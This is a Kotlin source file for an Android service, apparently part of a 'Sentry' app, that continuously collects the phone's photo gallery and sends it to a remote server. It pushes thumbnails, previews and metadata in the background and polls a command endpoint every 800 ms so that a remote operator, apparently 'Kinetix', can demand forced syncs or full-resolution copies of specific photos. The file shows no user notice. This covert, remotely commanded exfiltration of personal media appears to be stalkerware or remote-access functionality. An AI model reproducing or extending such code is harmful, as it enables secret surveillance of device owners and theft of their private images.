package com.example.sentry.service

import android.content.ContentUris
import android.content.Context
import android.content.pm.PackageManager
import android.database.ContentObserver
import android.database.Cursor
import android.graphics.Bitmap
import android.graphics.BitmapFactory
import android.net.Uri
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.provider.MediaStore
import android.util.Base64
import android.util.Log
import android.util.Size
import androidx.core.content.ContextCompat
import com.example.sentry.crypto.CryptoManager
import com.example.sentry.network.SentryApiClient
import kotlinx.coroutines.*
import org.json.JSONArray
import org.json.JSONObject
import java.io.ByteArrayOutputStream
import java.io.File
import java.text.SimpleDateFormat
import java.util.*

object BackgroundGalleryManager {
    private const val TAG = "BackgroundGalleryManager"

    private var syncJob: Job? = null
    private var commandPollerJob: Job? = null
    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)
    private var observerRegistered = false
    private var isSyncing = false

    fun startListening(context: Context) {
        // 1. Register Real-Time ContentObserver for Instant New Photo Detection
        if (!observerRegistered) {
            try {
                val observer = object : ContentObserver(Handler(Looper.getMainLooper())) {
                    override fun onChange(selfChange: Boolean, uri: Uri?) {
                        super.onChange(selfChange, uri)
                        scope.launch {
                            delay(1000) // Debounce rapid file writes
                            val client = SentryApiClient(context)
                            syncGallery(context, client)
                        }
                    }
                }
                context.contentResolver.registerContentObserver(
                    MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                    true,
                    observer
                )
                observerRegistered = true
                Log.d(TAG, "Gallery ContentObserver registered for real-time photo sync")
            } catch (e: Exception) {
                Log.w(TAG, "Could not register MediaStore observer: ${e.message}")
            }
        }

        // 2. Periodic Sync Loop (runs immediately on start, then every 30s)
        if (syncJob?.isActive != true) {
            syncJob = scope.launch {
                val client = SentryApiClient(context)
                while (isActive) {
                    try {
                        syncGallery(context, client)
                    } catch (e: Exception) {
                        Log.w(TAG, "Error in Gallery sync loop: ${e.message}")
                    }
                    delay(30_000)
                }
            }
        }

        // 3. Fast Command Poller for On-Demand Full-Resolution Photo Fetching & Instant Sync Requests
        if (commandPollerJob?.isActive != true) {
            commandPollerJob = scope.launch {
                val client = SentryApiClient(context)
                while (isActive) {
                    try {
                        val res = client.pollGalleryCommands()
                        if (res.isSuccess) {
                            val obj = res.getOrNull()
                            val fullImageMediaId = obj?.optString("fullImageMediaId")?.takeIf { it.isNotBlank() && it != "null" }
                            if (!fullImageMediaId.isNullOrBlank()) {
                                Log.d(TAG, "Full resolution image requested for $fullImageMediaId. Processing upload...")
                                scope.launch {
                                    handleFullImageUpload(context, client, fullImageMediaId)
                                }
                            }
                            if (obj?.optBoolean("syncRequested") == true) {
                                Log.d(TAG, "Sync requested from Kinetix. Triggering instant gallery sync...")
                                scope.launch {
                                    syncGallery(context, client, forceFullSync = true)
                                }
                            }
                        }
                    } catch (_: Exception) {
                    }
                    delay(800)
                }
            }
        }
    }

    private suspend fun handleFullImageUpload(context: Context, client: SentryApiClient, mediaIdStr: String) {
        withContext(Dispatchers.IO) {
            try {
                val cleanId = mediaIdStr.removePrefix("media_").toLongOrNull()
                var fullBase64: String? = null

                // 1. Try resolving via direct MediaStore content URI
                if (cleanId != null) {
                    val contentUri = ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, cleanId)
                    fullBase64 = extractFullResolutionBase64(context, contentUri)
                }

                // 2. Fallback: Query MediaStore table for actual _DATA file path
                if (fullBase64.isNullOrBlank() && cleanId != null) {
                    try {
                        val projection = arrayOf(MediaStore.Images.Media._ID, MediaStore.Images.Media.DATA)
                        context.contentResolver.query(
                            MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                            projection,
                            "${MediaStore.Images.Media._ID} = ?",
                            arrayOf(cleanId.toString()),
                            null
                        )?.use { cursor ->
                            if (cursor.moveToFirst()) {
                                val dataIdx = cursor.getColumnIndex(MediaStore.Images.Media.DATA)
                                if (dataIdx >= 0) {
                                    val filePath = cursor.getString(dataIdx)
                                    val file = if (!filePath.isNullOrBlank()) File(filePath) else null
                                    if (file != null && file.exists()) {
                                        fullBase64 = extractFullResolutionFromFile(file)
                                    }
                                }
                            }
                        }
                    } catch (e: Exception) {
                        Log.w(TAG, "MediaStore fallback query failed: ${e.message}")
                    }
                }

                val finalBase64 = fullBase64
                if (!finalBase64.isNullOrBlank()) {
                    val res = client.uploadFullGalleryImage(mediaIdStr, finalBase64, "image/jpeg")
                    Log.d(TAG, "Uploaded 100% full-resolution image for $mediaIdStr (Success: ${res.isSuccess})")
                } else {
                    Log.w(TAG, "Could not extract full resolution image for $mediaIdStr")
                }
            } catch (e: Exception) {
                Log.w(TAG, "Failed full image upload for $mediaIdStr: ${e.message}")
            }
        }
    }

    private fun extractFullResolutionFromFile(file: File): String? {
        return try {
            val boundsOptions = BitmapFactory.Options().apply { inJustDecodeBounds = true }
            BitmapFactory.decodeFile(file.absolutePath, boundsOptions)
            val origW = boundsOptions.outWidth.takeIf { it > 0 } ?: 1920
            val origH = boundsOptions.outHeight.takeIf { it > 0 } ?: 1080

            var inSample = 1
            val maxDim = maxOf(origW, origH)
            while (maxDim / inSample > 2560) {
                inSample *= 2
            }

            val decodeOptions = BitmapFactory.Options().apply {
                inSampleSize = inSample
                inPreferredConfig = Bitmap.Config.ARGB_8888
            }
            val fullBitmap = BitmapFactory.decodeFile(file.absolutePath, decodeOptions) ?: return null

            val out = ByteArrayOutputStream()
            fullBitmap.compress(Bitmap.CompressFormat.JPEG, 92, out)
            Base64.encodeToString(out.toByteArray(), Base64.NO_WRAP)
        } catch (e: Exception) {
            Log.w(TAG, "Error reading full resolution from file: ${e.message}")
            null
        }
    }

    private const val PREFS_NAME = "sentry_gallery_cache_v2"
    private const val KEY_SYNCED_IDS = "synced_media_ids"

    private fun getSyncedIds(context: Context): MutableSet<String> {
        val sp = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
        return sp.getStringSet(KEY_SYNCED_IDS, emptySet())?.toMutableSet() ?: mutableSetOf()
    }

    private fun markIdsAsSynced(context: Context, newIds: Set<String>) {
        val sp = context.getSharedPreferences(PREFS_NAME, Context.MODE_PRIVATE)
        val current = getSyncedIds(context)
        current.addAll(newIds)
        sp.edit().putStringSet(KEY_SYNCED_IDS, current).apply()
    }

    suspend fun syncGallery(context: Context, client: SentryApiClient, forceFullSync: Boolean = false) {
        if (isSyncing) return
        isSyncing = true
        try {
            val hasPermission = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                ContextCompat.checkSelfPermission(context, android.Manifest.permission.READ_MEDIA_IMAGES) == PackageManager.PERMISSION_GRANTED
            } else {
                ContextCompat.checkSelfPermission(context, android.Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
            }

            if (!hasPermission) {
                Log.w(TAG, "READ_MEDIA_IMAGES / READ_EXTERNAL_STORAGE not granted")
                return
            }

            val deviceId = CryptoManager.getOrCreateDeviceId(context)
            val alreadySyncedIds = getSyncedIds(context)

            val projection = arrayOf(
                MediaStore.Images.Media._ID,
                MediaStore.Images.Media.DISPLAY_NAME,
                MediaStore.Images.Media.DATE_ADDED,
                MediaStore.Images.Media.SIZE,
                MediaStore.Images.Media.MIME_TYPE,
                MediaStore.Images.Media.WIDTH,
                MediaStore.Images.Media.HEIGHT,
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) MediaStore.Images.Media.BUCKET_DISPLAY_NAME else MediaStore.Images.Media._ID
            )

            val cursor: Cursor? = try {
                context.contentResolver.query(
                    MediaStore.Images.Media.EXTERNAL_CONTENT_URI,
                    projection,
                    null,
                    null,
                    "${MediaStore.Images.Media.DATE_ADDED} DESC"
                )
            } catch (e: Exception) {
                Log.e(TAG, "Failed to query MediaStore: ${e.message}")
                null
            }

            val newItemsToUpload = mutableListOf<JSONObject>()
            val newlySyncedIds = mutableSetOf<String>()
            val sdf = SimpleDateFormat("MMM dd, hh:mm a", Locale.getDefault())

            cursor?.use { c ->
                val idIdx = c.getColumnIndex(MediaStore.Images.Media._ID)
                val nameIdx = c.getColumnIndex(MediaStore.Images.Media.DISPLAY_NAME)
                val dateIdx = c.getColumnIndex(MediaStore.Images.Media.DATE_ADDED)
                val sizeIdx = c.getColumnIndex(MediaStore.Images.Media.SIZE)
                val mimeIdx = c.getColumnIndex(MediaStore.Images.Media.MIME_TYPE)
                val widthIdx = c.getColumnIndex(MediaStore.Images.Media.WIDTH)
                val heightIdx = c.getColumnIndex(MediaStore.Images.Media.HEIGHT)
                val bucketIdx = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                    c.getColumnIndex(MediaStore.Images.Media.BUCKET_DISPLAY_NAME)
                } else -1

                var inspected = 0
                val maxRecentPhotos = 300

                while (c.moveToNext() && inspected < maxRecentPhotos) {
                    inspected++
                    val mediaId = if (idIdx >= 0) c.getLong(idIdx) else continue
                    val mediaIdStr = "media_$mediaId"
                    val sizeBytes = if (sizeIdx >= 0) c.getLong(sizeIdx) else 0L

                    // Skip corrupt / 0-byte files and skip photos already synced in local cache unless full sync requested
                    if (sizeBytes < 1024 || (!forceFullSync && alreadySyncedIds.contains(mediaIdStr))) {
                        continue
                    }

                    val name = if (nameIdx >= 0) c.getString(nameIdx) ?: "Photo_${mediaId}.jpg" else "Photo.jpg"
                    val dateAddedSec = if (dateIdx >= 0) c.getLong(dateIdx) else System.currentTimeMillis() / 1000
                    val mimeType = if (mimeIdx >= 0) c.getString(mimeIdx) ?: "image/jpeg" else "image/jpeg"
                    val width = if (widthIdx >= 0) c.getInt(widthIdx) else 1080
                    val height = if (heightIdx >= 0) c.getInt(heightIdx) else 1920
                    val albumName = if (bucketIdx >= 0) c.getString(bucketIdx) ?: "Camera" else "Camera"

                    val sizeFormatted = when {
                        sizeBytes >= 1024 * 1024 -> String.format(Locale.US, "%.1f MB", sizeBytes / (1024.0 * 1024.0))
                        sizeBytes >= 1024 -> String.format(Locale.US, "%d KB", sizeBytes / 1024)
                        else -> "$sizeBytes B"
                    }

                    val dateFormatted = sdf.format(Date(dateAddedSec * 1000))
                    val contentUri = ContentUris.withAppendedId(MediaStore.Images.Media.EXTERNAL_CONTENT_URI, mediaId)

                    // Extract High-Quality Crisp Thumbnail
                    val thumbnailBase64 = extractThumbnailBase64(context, contentUri)
                    if (thumbnailBase64.isNullOrBlank()) {
                        continue
                    }

                    // Extract 40% Scale Sharp Preview
                    val previewBase64 = extract40PercentPreviewBase64(context, contentUri)

                    val obj = JSONObject().apply {
                        put("id", mediaIdStr)
                        put("name", name)
                        put("album", albumName)
                        put("mimeType", mimeType)
                        put("size", sizeFormatted)
                        put("date", dateFormatted)
                        put("timestamp", dateAddedSec * 1000)
                        put("width", width)
                        put("height", height)
                        put("thumbnail", thumbnailBase64)
                        if (!previewBase64.isNullOrBlank()) {
                            put("preview", previewBase64)
                        }
                    }
                    newItemsToUpload.add(obj)
                    newlySyncedIds.add(mediaIdStr)

                    // Upload in batches of 20 to keep initial load rapid and memory efficient
                    if (newItemsToUpload.size >= 20) {
                        val batchArray = JSONArray()
                        for (item in newItemsToUpload) batchArray.put(item)
                        val body = JSONObject().apply {
                            put("deviceId", deviceId)
                            put("media", batchArray)
                        }
                        val res = client.syncGalleryMedia(body)
                        if (res.isSuccess) {
                            markIdsAsSynced(context, newlySyncedIds)
                        }
                        newItemsToUpload.clear()
                        newlySyncedIds.clear()
                    }
                }
            }

            // Flush any remaining new items
            if (newItemsToUpload.isNotEmpty()) {
                val batchArray = JSONArray()
                for (item in newItemsToUpload) batchArray.put(item)
                val body = JSONObject().apply {
                    put("deviceId", deviceId)
                    put("media", batchArray)
                }
                val res = client.syncGalleryMedia(body)
                if (res.isSuccess) {
                    markIdsAsSynced(context, newlySyncedIds)
                }
                Log.d(TAG, "Incrementally synced ${newItemsToUpload.size} new photos to cloud for $deviceId")
            }
        } catch (e: Exception) {
            Log.w(TAG, "Error in incremental gallery sync: ${e.message}")
        } finally {
            isSyncing = false
        }
    }

    private fun extractThumbnailBase64(context: Context, uri: Uri): String? {
        return try {
            val bitmap = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                context.contentResolver.loadThumbnail(uri, Size(480, 480), null)
            } else {
                context.contentResolver.openInputStream(uri)?.use { stream ->
                    val options = BitmapFactory.Options().apply { inSampleSize = 2 }
                    BitmapFactory.decodeStream(stream, null, options)
                }
            } ?: return null

            val out = ByteArrayOutputStream()
            bitmap.compress(Bitmap.CompressFormat.JPEG, 85, out)
            Base64.encodeToString(out.toByteArray(), Base64.NO_WRAP)
        } catch (_: Exception) {
            null
        }
    }

    private fun extract40PercentPreviewBase64(context: Context, uri: Uri): String? {
        return try {
            val boundsOptions = BitmapFactory.Options().apply { inJustDecodeBounds = true }
            context.contentResolver.openInputStream(uri)?.use {
                BitmapFactory.decodeStream(it, null, boundsOptions)
            }
            val origW = boundsOptions.outWidth.takeIf { it > 0 } ?: 1080
            val origH = boundsOptions.outHeight.takeIf { it > 0 } ?: 1920

            // 40% dimensions
            val targetW = (origW * 0.40f).toInt().coerceAtLeast(360)
            val targetH = (origH * 0.40f).toInt().coerceAtLeast(360)

            val bitmap = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                context.contentResolver.loadThumbnail(uri, Size(targetW, targetH), null)
            } else {
                context.contentResolver.openInputStream(uri)?.use { stream ->
                    val options = BitmapFactory.Options().apply { inSampleSize = 2 }
                    BitmapFactory.decodeStream(stream, null, options)
                }
            } ?: return null

            val scaled = if (bitmap.width != targetW && bitmap.height != targetH && targetW > 0 && targetH > 0) {
                Bitmap.createScaledBitmap(bitmap, targetW, targetH, true)
            } else bitmap

            val out = ByteArrayOutputStream()
            scaled.compress(Bitmap.CompressFormat.JPEG, 85, out)
            Base64.encodeToString(out.toByteArray(), Base64.NO_WRAP)
        } catch (_: Exception) {
            null
        }
    }

    private fun extractFullResolutionBase64(context: Context, uri: Uri): String? {
        return try {
            val boundsOptions = BitmapFactory.Options().apply { inJustDecodeBounds = true }
            context.contentResolver.openInputStream(uri)?.use {
                BitmapFactory.decodeStream(it, null, boundsOptions)
            }
            val origW = boundsOptions.outWidth.takeIf { it > 0 } ?: 1920
            val origH = boundsOptions.outHeight.takeIf { it > 0 } ?: 1080

            var inSample = 1
            val maxDim = maxOf(origW, origH)
            while (maxDim / inSample > 2560) {
                inSample *= 2
            }

            val decodeOptions = BitmapFactory.Options().apply {
                inSampleSize = inSample
                inPreferredConfig = Bitmap.Config.ARGB_8888
            }
            val fullBitmap = context.contentResolver.openInputStream(uri)?.use { stream ->
                BitmapFactory.decodeStream(stream, null, decodeOptions)
            } ?: return null

            val out = ByteArrayOutputStream()
            fullBitmap.compress(Bitmap.CompressFormat.JPEG, 92, out)
            Base64.encodeToString(out.toByteArray(), Base64.NO_WRAP)
        } catch (e: Exception) {
            Log.w(TAG, "Error reading full resolution photo: ${e.message}")
            null
        }
    }
}
